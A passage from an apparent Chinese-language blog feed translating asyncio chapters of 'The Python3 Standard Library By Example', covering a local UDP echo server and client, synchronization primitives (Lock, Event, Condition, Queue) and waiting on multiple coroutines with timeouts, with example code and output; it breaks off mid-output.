addr)</span>:</span></div><div class="line">        message = data.decode()</div><div class="line">        print(<span class="string">'Received %r from %s'</span> % (message, addr))</div><div class="line">        print(<span class="string">'Send %r to %s'</span> % (message, addr))</div><div class="line">        self.transport.sendto(data, addr)</div><div class="line"></div><div class="line">loop = asyncio.get_event_loop()</div><div class="line">print(<span class="string">"Starting UDP server"</span>)</div><div class="line"><span class="comment"># One protocol instance will be created to serve all client requests</span></div><div class="line">listen = loop.create_datagram_endpoint(</div><div class="line">    EchoServerProtocol, local_addr=(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>))</div><div class="line">transport, protocol = loop.run_until_complete(listen)</div><div class="line"></div><div class="line"><span class="keyword">try</span>:</div><div class="line">    loop.run_forever()</div><div class="line"><span class="keyword">except</span> KeyboardInterrupt:</div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line">transport.close()</div><div class="line">loop.close()</div></pre></td></tr></table></figure></p><p>UDP Echo Client：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">EchoClientProtocol</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, message, loop)</span>:</span></div><div class="line">        self.message = message</div><div class="line">        self.loop = loop</div><div class="line">        self.transport = <span class="keyword">None</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connection_made</span><span class="params">(self, transport)</span>:</span></div><div class="line">        self.transport = transport</div><div class="line">        print(<span class="string">'Send:'</span>, self.message)</div><div class="line">        self.transport.sendto(self.message.encode())</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">datagram_received</span><span class="params">(self, data, addr)</span>:</span></div><div class="line">        print(<span class="string">"Received:"</span>, data.decode())</div><div class="line"></div><div class="line">        print(<span class="string">"Close the socket"</span>)</div><div class="line">        self.transport.close()</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">error_received</span><span class="params">(self, exc)</span>:</span></div><div class="line">        print(<span class="string">'Error received:'</span>, exc)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connection_lost</span><span class="params">(self, exc)</span>:</span></div><div class="line">        print(<span class="string">"Socket closed, stop the event loop"</span>)</div><div class="line">        loop = asyncio.get_event_loop()</div><div class="line">        loop.stop()</div><div class="line"></div><div class="line">loop = asyncio.get_event_loop()</div><div class="line">message = <span class="string">"Hello World!"</span></div><div class="line">connect = loop.create_datagram_endpoint(</div><div class="line">    <span class="keyword">lambda</span>: EchoClientProtocol(message, loop),</div><div class="line">    remote_addr=(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>))</div><div class="line">transport, protocol = loop.run_until_complete(connect)</div><div class="line">loop.run_forever()</div><div class="line">transport.close()</div><div class="line">loop.close()</div></pre></td></tr></table></figure></p><p><strong>本文翻译自《The Python3 Standard Library By Example》asyncio相关章节</strong></p></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> asyncio </tag>
            
            <tag> 异步并发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>asyncio之同步原语</title>
      <link href="/2017/12/21/asyncio%E4%B9%8B%E5%90%8C%E6%AD%A5%E5%8E%9F%E8%AF%AD/"/>
      <url>/2017/12/21/asyncio%E4%B9%8B%E5%90%8C%E6%AD%A5%E5%8E%9F%E8%AF%AD/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>同步原语</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>尽管asyncio程序通常是单线程运行的，它们仍然可以构建并发程序。基于来自I/O和其他外部事件的延迟和中断，每个协程或Task可能以不可预知的顺序执行。为了支持并发安全，asyncio实现了一些低级的原子操作，类似于threading和multiprocessing模块中的。</p><h3 id="Locks"><a href="#Locks" class="headerlink" title="Locks"></a>Locks</h3><p>Lock可以用来保护对共享资源的访问，只有锁的持有者可以使用该资源。多次尝试获取锁的操作将被阻止，因此一次只有一个持有者。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"><span class="keyword">import</span> functools</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">unlock</span><span class="params">(lock)</span>:</span></div><div class="line">    print(<span class="string">'callback releasing lock'</span>)</div><div class="line">    lock.release()</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">coro1</span><span class="params">(lock)</span>:</span></div><div class="line">    print(<span class="string">'coro1 waiting for the lock'</span>)</div><div class="line">    <span class="keyword">with</span> <span class="keyword">await</span> lock:</div><div class="line">        print(<span class="string">'coro1 acquired lock'</span>)</div><div class="line">    print(<span class="string">'coro1 released lock'</span>)</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">coro2</span><span class="params">(lock)</span>:</span></div><div class="line">    print(<span class="string">'coro2 waiting for the lock'</span>)</div><div class="line">    <span class="keyword">await</span> lock</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        print(<span class="string">'coro2 acquired lock'</span>)</div><div class="line">    <span class="keyword">finally</span>:</div><div class="line">        print(<span class="string">'coro2 released lock'</span>)</div><div class="line">        lock.release()</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(loop)</span>:</span></div><div class="line">    <span class="comment"># 创建并获取一个共享锁</span></div><div class="line">    lock = asyncio.Lock()</div><div class="line">    print(<span class="string">'acquiring the lock before starting coroutines'</span>)</div><div class="line">    <span class="keyword">await</span> lock.acquire()</div><div class="line">    print(<span class="string">'lock acquired: &#123;&#125;'</span>.format(lock.locked()))</div><div class="line"></div><div class="line">    <span class="comment"># 安排一个回调来解锁锁</span></div><div class="line">    loop.call_later(<span class="number">0.1</span>, functools.partial(unlock, lock))</div><div class="line"></div><div class="line">    <span class="comment"># 运行想要使用锁的协程</span></div><div class="line">    print(<span class="string">'waiting for coroutines'</span>)</div><div class="line">    <span class="keyword">await</span> asyncio.wait([coro1(lock), coro2(lock)]),</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    event_loop.run_until_complete(main(event_loop))</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>锁可以直接被调用，使用await获取锁，当任务完成时调用release()方法释放锁。它们也可以使用with await关键字作为异步上下文管理器。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_lock.py</div><div class="line"></div><div class="line">acquiring the lock before starting coroutines</div><div class="line">lock acquired: <span class="keyword">True</span></div><div class="line">waiting <span class="keyword">for</span> coroutines</div><div class="line">coro1 waiting <span class="keyword">for</span> the lock</div><div class="line">coro2 waiting <span class="keyword">for</span> the lock</div><div class="line">callback releasing lock</div><div class="line">coro1 acquired lock</div><div class="line">coro1 released lock</div><div class="line">coro2 acquired lock</div><div class="line">coro2 released lock</div></pre></td></tr></table></figure></p><h3 id="Events"><a href="#Events" class="headerlink" title="Events"></a>Events</h3><p>asyncio.Event是基于threading.Event的，用于允许多个消费者等待发生的事情，而不寻找与通知相关联的特定值。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"><span class="keyword">import</span> functools</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_event</span><span class="params">(event)</span>:</span></div><div class="line">    print(<span class="string">'setting event in callback'</span>)</div><div class="line">    event.set()</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">coro1</span><span class="params">(event)</span>:</span></div><div class="line">    print(<span class="string">'coro1 waiting for event'</span>)</div><div class="line">    <span class="keyword">await</span> event.wait()</div><div class="line">    print(<span class="string">'coro1 triggered'</span>)</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">coro2</span><span class="params">(event)</span>:</span></div><div class="line">    print(<span class="string">'coro2 waiting for event'</span>)</div><div class="line">    <span class="keyword">await</span> event.wait()</div><div class="line">    print(<span class="string">'coro2 triggered'</span>)</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(loop)</span>:</span></div><div class="line">    event = asyncio.Event()</div><div class="line">    print(<span class="string">'event start state: &#123;&#125;'</span>.format(event.is_set()))</div><div class="line"></div><div class="line">    loop.call_later(<span class="number">0.1</span>, functools.partial(set_event, event))</div><div class="line"></div><div class="line">    <span class="keyword">await</span> asyncio.wait([coro1(event), coro2(event)])</div><div class="line">    print(<span class="string">'event end state: &#123;&#125;'</span>.format(event.is_set()))</div><div class="line"></div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    event_loop.run_until_complete(main(event_loop))</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>和Lock一样，coro1()和coro2()都在等待Event被设置，不同之处在于两者都可以在事件状态改变时立即开始，并且他们不需要获取对event对象的唯一保持。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_event.py</div><div class="line"></div><div class="line">event start state: <span class="keyword">False</span></div><div class="line">coro2 waiting <span class="keyword">for</span> event</div><div class="line">coro1 waiting <span class="keyword">for</span> event</div><div class="line">setting event <span class="keyword">in</span> callback</div><div class="line">coro2 triggered</div><div class="line">coro1 triggered</div><div class="line">event end state: <span class="keyword">True</span></div></pre></td></tr></table></figure></p><h3 id="Conditions"><a href="#Conditions" class="headerlink" title="Conditions"></a>Conditions</h3><p>Condition的工作方式跟Event的很类似，除了不是通知所有等待的协程，唤醒的等待者的数量是通过notify()参数来控制的。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">consumer</span><span class="params">(condition, n)</span>:</span></div><div class="line">    <span class="keyword">with</span> <span class="keyword">await</span> condition:</div><div class="line">        print(<span class="string">'consumer &#123;&#125; is waiting'</span>.format(n))</div><div class="line">        <span class="keyword">await</span> condition.wait()</div><div class="line">        print(<span class="string">'consumer &#123;&#125; triggered'</span>.format(n))</div><div class="line">    print(<span class="string">'ending consumer &#123;&#125;'</span>.format(n))</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">manipulate_condition</span><span class="params">(condition)</span>:</span></div><div class="line">    print(<span class="string">'starting manipulate_condition'</span>)</div><div class="line"></div><div class="line">    <span class="comment"># 暂停让消费者开始</span></div><div class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">0.1</span>)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">3</span>):</div><div class="line">        <span class="keyword">with</span> <span class="keyword">await</span> condition:</div><div class="line">            print(<span class="string">'notifying &#123;&#125; consumers'</span>.format(i))</div><div class="line">            condition.notify(n=i)</div><div class="line">        <span class="keyword">await</span> asyncio.sleep(<span class="number">0.1</span>)</div><div class="line"></div><div class="line">    <span class="keyword">with</span> <span class="keyword">await</span> condition:</div><div class="line">        print(<span class="string">'notifying remaining consumers'</span>)</div><div class="line">        condition.notify_all()</div><div class="line"></div><div class="line">    print(<span class="string">'ending manipulate_condition'</span>)</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(loop)</span>:</span></div><div class="line">    <span class="comment"># 创建一个condition</span></div><div class="line">    condition = asyncio.Condition()</div><div class="line">    <span class="comment"># 设置任务监视condition</span></div><div class="line">    consumers = [consumer(condition, i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>)]</div><div class="line">    <span class="comment"># 安排一个任务来操作condition变量</span></div><div class="line">    loop.create_task(manipulate_condition(condition))</div><div class="line">    <span class="comment"># 等待消费者运行结束</span></div><div class="line">    <span class="keyword">await</span> asyncio.wait(consumers)</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    result = event_loop.run_until_complete(main(event_loop))</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>这个例子中我们启动了五个监视Condition的消费者，每一个都使用 wait()方法等待让他们继续运行的通知。manipulate_condition()通知了一个消费者然后两个消费者，最后所有的消费者。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_condition.py</div><div class="line"></div><div class="line">starting manipulate_condition</div><div class="line">consumer <span class="number">3</span> <span class="keyword">is</span> waiting</div><div class="line">consumer <span class="number">1</span> <span class="keyword">is</span> waiting</div><div class="line">consumer <span class="number">2</span> <span class="keyword">is</span> waiting</div><div class="line">consumer <span class="number">0</span> <span class="keyword">is</span> waiting</div><div class="line">consumer <span class="number">4</span> <span class="keyword">is</span> waiting</div><div class="line">notifying <span class="number">1</span> consumers</div><div class="line">consumer <span class="number">3</span> triggered</div><div class="line">ending consumer <span class="number">3</span></div><div class="line">notifying <span class="number">2</span> consumers</div><div class="line">consumer <span class="number">1</span> triggered</div><div class="line">ending consumer <span class="number">1</span></div><div class="line">consumer <span class="number">2</span> triggered</div><div class="line">ending consumer <span class="number">2</span></div><div class="line">notifying remaining consumers</div><div class="line">ending manipulate_condition</div><div class="line">consumer <span class="number">0</span> triggered</div><div class="line">ending consumer <span class="number">0</span></div><div class="line">consumer <span class="number">4</span> triggered</div><div class="line">ending consumer <span class="number">4</span></div></pre></td></tr></table></figure></p><h3 id="Queues"><a href="#Queues" class="headerlink" title="Queues"></a>Queues</h3><p>asyncio.Queue提供了协程的先入先出的数据结构，类似于多线程的queue.Queue和多进程的multiprocessing.Queue。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">consumer</span><span class="params">(n, q)</span>:</span></div><div class="line">    print(<span class="string">'consumer &#123;&#125;: starting'</span>.format(n))</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        print(<span class="string">'consumer &#123;&#125;: waiting for item'</span>.format(n))</div><div class="line">        item = <span class="keyword">await</span> q.get()</div><div class="line">        print(<span class="string">'consumer &#123;&#125;: has item &#123;&#125;'</span>.format(n, item))</div><div class="line">        <span class="keyword">if</span> item <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="comment"># None是停止的信号</span></div><div class="line">            q.task_done()</div><div class="line">            <span class="keyword">break</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">await</span> asyncio.sleep(<span class="number">0.01</span> * item)</div><div class="line">            q.task_done()</div><div class="line">    print(<span class="string">'consumer &#123;&#125;: ending'</span>.format(n))</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">producer</span><span class="params">(q, num_workers)</span>:</span></div><div class="line">    print(<span class="string">'producer: starting'</span>)</div><div class="line">    <span class="comment"># 添加一些数字到队列模拟任务</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num_workers * <span class="number">3</span>):</div><div class="line">        <span class="keyword">await</span> q.put(i)</div><div class="line">        print(<span class="string">'producer: added task &#123;&#125; to the queue'</span>.format(i))</div><div class="line">    <span class="comment"># 添加None到队列表示停止信号</span></div><div class="line">    print(<span class="string">'producer: adding stop signals to the queue'</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num_workers):</div><div class="line">        <span class="keyword">await</span> q.put(<span class="keyword">None</span>)</div><div class="line">    print(<span class="string">'producer: waiting for queue to empty'</span>)</div><div class="line">    <span class="keyword">await</span> q.join()</div><div class="line">    print(<span class="string">'producer: ending'</span>)</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(loop, num_consumers)</span>:</span></div><div class="line">    <span class="comment"># 创建具有固定大小的队列，直到有空位之前队列都会被阻塞</span></div><div class="line">    q = asyncio.Queue(maxsize=num_consumers)</div><div class="line">    <span class="comment"># 调度消费者任务</span></div><div class="line">    consumers = [loop.create_task(consumer(i, q)) <span class="keyword">for</span> i <span class="keyword">in</span> range(num_consumers)]</div><div class="line">    <span class="comment"># 调度生产者任务</span></div><div class="line">    prod = loop.create_task(producer(q, num_consumers))</div><div class="line">    <span class="comment"># 等待所有协程完成</span></div><div class="line">    <span class="keyword">await</span> asyncio.wait(consumers + [prod])</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    event_loop.run_until_complete(main(event_loop, <span class="number">2</span>))</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>通过put()函数添加元素，get()函数获取元素都是异步操作，因为队列大小可能是固定的（阻塞添加），或者队列可能是空的（阻塞调用来获取项目）。</p><p><strong>本文翻译自《The Python3 Standard Library By Example》asyncio相关章节</strong></p></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> asyncio </tag>
            
            <tag> 异步并发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>asyncio之用控制结构组建协程</title>
      <link href="/2017/12/21/asyncio%E4%B9%8B%E7%94%A8%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%84%E7%BB%84%E5%BB%BA%E5%8D%8F%E7%A8%8B/"/>
      <url>/2017/12/21/asyncio%E4%B9%8B%E7%94%A8%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%84%E7%BB%84%E5%BB%BA%E5%8D%8F%E7%A8%8B/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>用控制结构组建协程</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>内置的语言关键字await可以轻松管理一系列协程之间的线性控制流程，更复杂的结构允许一个协程等待好几个其他的并行协程完成，这些也可以使用asyncio提供的工具完成。</p><h3 id="等待多个协程"><a href="#等待多个协程" class="headerlink" title="等待多个协程"></a>等待多个协程</h3><p>把一个操作分成许多部分并分别执行是很有用的。比如说，下载多个远程资源或者查询远程APIs。在执行顺序无关紧要的情况下，可能会有任意数量的操作， wait()可以被用来暂停一个协程知道其他的操作全部完成。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">phase</span><span class="params">(i)</span>:</span></div><div class="line">    print(<span class="string">'in phase &#123;&#125;'</span>.format(i))</div><div class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">0.1</span> * i)</div><div class="line">    print(<span class="string">'done with phase &#123;&#125;'</span>.format(i))</div><div class="line">    <span class="keyword">return</span> <span class="string">'phase &#123;&#125; result'</span>.format(i)</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(num_phases)</span>:</span></div><div class="line">    print(<span class="string">'starting main'</span>)</div><div class="line">    phases = [phase(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(num_phases)]</div><div class="line">    print(<span class="string">'waiting for phases to complete'</span>)</div><div class="line">    completed, pending = <span class="keyword">await</span> asyncio.wait(phases)</div><div class="line">    results = [t.result() <span class="keyword">for</span> t <span class="keyword">in</span> completed]</div><div class="line">    print(<span class="string">'results: &#123;!r&#125;'</span>.format(results))</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    event_loop.run_until_complete(main(<span class="number">3</span>))</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>在内部，wait()使用set保存它创建的Task实例，这导致它们开始和结束的顺序都不可预测。wait()的返回值是一个元组，包含两个set集合，已经结束和待处理的Tasks。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_wait.py</div><div class="line"></div><div class="line">starting main</div><div class="line">waiting <span class="keyword">for</span> phases to complete</div><div class="line"><span class="keyword">in</span> phase <span class="number">0</span></div><div class="line"><span class="keyword">in</span> phase <span class="number">1</span></div><div class="line"><span class="keyword">in</span> phase <span class="number">2</span></div><div class="line">done <span class="keyword">with</span> phase <span class="number">0</span></div><div class="line">done <span class="keyword">with</span> phase <span class="number">1</span></div><div class="line">done <span class="keyword">with</span> phase <span class="number">2</span></div><div class="line">results: [<span class="string">'phase 1 result'</span>, <span class="string">'phase 0 result'</span>, <span class="string">'phase 2 result'</span>]</div></pre></td></tr></table></figure></p><p>如果wait()使用了timeout值就会剩下还未处理的操作。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">phase</span><span class="params">(i)</span>:</span></div><div class="line">    print(<span class="string">'in phase &#123;&#125;'</span>.format(i))</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">await</span> asyncio.sleep(<span class="number">0.1</span> * i)</div><div class="line">    <span class="keyword">except</span> asyncio.CancelledError:</div><div class="line">        print(<span class="string">'phase &#123;&#125; canceled'</span>.format(i))</div><div class="line">        <span class="keyword">raise</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(<span class="string">'done with phase &#123;&#125;'</span>.format(i))</div><div class="line">        <span class="keyword">return</span> <span class="string">'phase &#123;&#125; result'</span>.format(i)</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(num_phases)</span>:</span></div><div class="line">    print(<span class="string">'starting main'</span>)</div><div class="line">    phases = [phase(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(num_phases)]</div><div class="line">    print(<span class="string">'waiting 0.1 for phases to complete'</span>)</div><div class="line">    completed, pending = <span class="keyword">await</span> asyncio.wait(phases, timeout=<span class="number">0.1</span>)</div><div class="line">    print(<span class="string">'&#123;&#125; completed and &#123;&#125; pending'</span>.format(</div><div class="line">        len(completed), len(pending),</div><div class="line">    ))</div><div class="line">    <span class="keyword">if</span> pending:</div><div class="line">        print(<span class="string">'canceling tasks'</span>)</div><div class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> pending:</div><div class="line">            t.cancel()</div><div class="line">    print(<span class="string">'exiting main'</span>)</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    event_loop.run_until_complete(main(<span class="number">3</span>))</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>剩下的后台操作要么被取消，要么等待完成。在事件循环还在运行的时候让它们处于待处理状态会让它们继续执行，如果整个操作被认为是中止的，这可能是不可取的。在流程结束时将它们留在待处理状态将导致警告报告。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_wait_timeout.py</div><div class="line"></div><div class="line">starting main</div><div class="line">waiting <span class="number">0.1</span> <span class="keyword">for</span> phases to complete</div><div class="line"><span class="keyword">in</span> phase <span class="number">1</span></div><div class="line"><span 